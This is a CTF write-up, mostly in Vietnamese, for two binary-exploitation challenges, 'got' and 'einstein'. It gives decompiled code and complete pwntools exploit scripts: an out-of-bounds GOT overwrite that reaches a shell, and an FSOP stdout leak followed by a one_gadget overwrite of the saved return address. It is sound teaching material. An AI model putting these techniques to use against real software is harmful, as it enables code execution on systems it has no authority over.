--- 
title: PwnMe CTF Quals 2025
date: 2025-02-16 00:00:00 +0800
categories: [writeup]
tags: [pwn,writeup]
author: "kuvee"
layout: post
---

# got

checksec: 

```cs
ploi@PhuocLoiiiii:~/pwn/PwnMeCTF/got/got$ checksec got
[*] '/home/ploi/pwn/PwnMeCTF/got/got/got'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- main : chương trình rất đơn giản , đầu tiên ta sẽ được nhập 1 idx , tiếp sau đó là nhập dữ liệu vào ```PNJS[idx]```  và nó nằm tại ```0x0000000000404080``` 

```cs
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int idx; // [rsp+4h] [rbp-Ch] BYREF
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  idx = 0;
  puts("Hey ! I've never seen Game of Thrones and i think i misspelled a name, can you help me ?");
  puts("Which name is misspelled ?\n1. John\n2. Daenarys\n3. Bran\n4. Arya");
  fwrite("> ", 1uLL, 2uLL, stdout);
  __isoc99_scanf("%d", &idx);
  if ( idx > 4 )
  {
    puts("Huuuhhh, i do not know that many people yet...");
    _exit(0);
  }
  puts("Oh really ? What's the correct spelling ?");
  fwrite("> ", 1uLL, 2uLL, stdout);
  read(0, &PNJs[idx], 0x20uLL);
  puts("Thanks for the help, next time i'll give you a shell, i already prepared it :)");
  return 0;
}
```

- rõ ràng đây là 1 bài xảy ra bug ```oob``` , ta có thể ghi idx tiến đến got và ghi vào thứ gì đó để lấy shell và may mắn là có 1 hàm win

```cs
void __cdecl shell()
{
  system("/bin/sh");
}
```

exp: 

```cs
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./got',checksec=False)

#p = process()
p = remote('got-4d27ff88d1920941.deploy.phreaks.fr',443,ssl=True)

p.sendline(b'-4')
input()
p.send(p64(0x401036) + p64(exe.sym.shell))

p.interactive()
```

# einstein

checksec: full giáp

```cs
ploi@PhuocLoiiiii:~/pwn/PwnMeCTF/einstein/einstein$ checksec einstein
[*] '/home/ploi/pwn/PwnMeCTF/einstein/einstein/einstein'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

- handle: đây là hàm chứa dữ liệu chính cần khai thác của bài , đập vào mắt đầu tiên có lẽ là ta có 2 lệnh scanf -> ta có thể ghi tùy ý 2 lần 


```cs
int __cdecl handle()
{
  int offset; // [rsp+8h] [rbp-38h] BYREF
  unsigned int size; // [rsp+Ch] [rbp-34h] BYREF
  unsigned __int64 *wher; // [rsp+10h] [rbp-30h] BYREF
  unsigned __int64 wat; // [rsp+18h] [rbp-28h] BYREF
  unsigned __int64 *wher2; // [rsp+20h] [rbp-20h] BYREF
  unsigned __int64 wat2; // [rsp+28h] [rbp-18h] BYREF
  void *allocated; // [rsp+30h] [rbp-10h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  puts("\nHow long is your story ?");
  __isoc99_scanf("%u", &size);
  if ( size <= 0x27 )
  {
    puts("Well... It seems you don't really want to talk to me that much, cya.");
    _exit(1337);
  }
  allocated = malloc(size);
  puts("What's the distortion of time and space ?");
  __isoc99_scanf("%u", &offset);
  puts(
    "Well your story is quite long, time may be distored, but it is a priceless ressource, i'll give you a few words only"
    ", use them wisely.");
  read(0, (char *)allocated + offset, 0x22uLL);
  puts("Everything is relative... Or is it ???");
  __isoc99_scanf("%llu %llu", &wher, &wat);
  __isoc99_scanf("%llu %llu", &wher2, &wat2);
  *wher = wat;
  *wher2 = wat2;
  return 0;
}
```

- và bài này hốc búa ở chỗ là ta không biết bất cứ địa chỉ nào -> sẽ không thể ghi được gì , tuy nhiên để ý lại đoạn ở trên , ta được nhập 1 size và malloc(size) 
- tiếp theo ta được input vào 0x22 vào chunk đó , ở đây ta cần biết khi ta nhập 1 size lớn -> nó sẽ dùng mmap để tạo 1 vùng nhớ cho yêu cầu của malloc() , và vùng nhớ đó nằm dưới ngay libc

- ở đây mình nhập 1 size rất lớn

![here](/assets/images/PWNme2025/1.png)

- và nó nằm ngay dưới libc

![here](/assets/images/PWNme2025/2.png)

- như ta đã nói thì trước hết ta cần biết địa chỉ libc , ở đây ta cần tấn công ```fsop``` , chi tiết thì ta có thể xem ở [here](https://github.com/nobodyisnobody/docs/tree/main/using.stdout.as.a.read.primitive/)  , ở đây mình chọn overwrite ```IO_write_PTR``` bằng byte ```\xff```  hoặc là ta có thể overwrite như link trên cũng được , và may mắn là ta có libc lẫn stack_address  
- lúc đầu mình không leak được stack_address vì phiên bản libc bài cho không giống sever , sau khi build docker và lấy libc lại thì mới leak được stack :)))

- cuối cũng đơn giản là overwrite ```saved_rip``` thành one_gadget thôi , ta có 2 lần ghi nên ta có thể làm cho nó thõa mãn điều kiện của one_gadget

- ở đây mình chọn cái này : 

rax NULL sẵn và ta chỉ cần setup cho ```rbp-0x78``` thôi là được

```cs
0xeb66b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```

exp: 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./einstein_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

p = process()

p.sendlineafter(b'How long is your story ?\n', str(0x50000).encode())


p.sendlineafter(b"What's the distortion of time and space ?\n", str(0x253790+0x28).encode())


input()
p.sendafter(b'.\n', b'\xff')

p.recv(5)
libc_leak = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'libc leak: {hex(libc_leak)}')
p.recv(0x92)
leak_stack = u64(p.recv(6).ljust(8,b'\x00'))
log.info(f'leak_stack: {hex(leak_stack)}')
saved_rip = leak_stack - 0x120
log.info(f'saved_rip: {hex(saved_rip)}')
libc.address = libc_leak - 0x2008f0
log.info(f'libc: {hex(libc.address)}')
rbp = saved_rip + 8
og = [0xeb66b,0xeb60e,0x54f53,0x54f4c]

p.sendlineafter(b'Everything is relative... Or is it ???',str(int(saved_rip)) + ' ' + str(int(libc.address+og[0])))
input()
p.sendline(str(int(rbp-0x78)) + ' ' + str(int(0)))

p.interactive()
```